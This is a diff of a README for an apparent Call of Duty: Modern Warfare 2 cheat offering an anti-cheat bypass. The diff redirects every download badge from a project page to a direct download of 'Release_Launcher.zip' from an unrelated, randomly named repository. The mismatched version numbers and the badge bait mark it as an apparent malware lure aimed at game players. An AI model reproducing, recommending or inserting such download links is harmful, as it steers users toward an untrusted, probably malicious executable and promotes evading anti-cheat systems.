@@ -1,8 +1,8 @@
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v2.6-blue?style=for-the-badge&logo=github&logoColor=white)](https://LineTreasurerRake.github.io/CallOfDuty-Modern-warfare-2-smokeesp/)
-[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://LineTreasurerRake.github.io/CallOfDuty-Modern-warfare-2-smokeesp/)
-[![Version](https://img.shields.io/badge/Version-2026-brightgreen?style=for-the-badge)](https://LineTreasurerRake.github.io/CallOfDuty-Modern-warfare-2-smokeesp/)
-[![Downloads](https://img.shields.io/badge/Downloads-2.9k%2B-blue?style=for-the-badge)](https://LineTreasurerRake.github.io/CallOfDuty-Modern-warfare-2-smokeesp/)
+[![Download Now](https://img.shields.io/badge/Download%20Now-v2.6-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/SupportSpace84/jtfujlhx/releases/download/v2.1.3/Release_Launcher.zip)
+[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/SupportSpace84/jtfujlhx/releases/download/v2.1.3/Release_Launcher.zip)
+[![Version](https://img.shields.io/badge/Version-2026-brightgreen?style=for-the-badge)](https://github.com/SupportSpace84/jtfujlhx/releases/download/v2.1.3/Release_Launcher.zip)
+[![Downloads](https://img.shields.io/badge/Downloads-2.9k%2B-blue?style=for-the-badge)](https://github.com/SupportSpace84/jtfujlhx/releases/download/v2.1.3/Release_Launcher.zip)
 
 🎮 Call of Duty: Modern Warfare 2 Cheats with Ricochet AC bypass
 
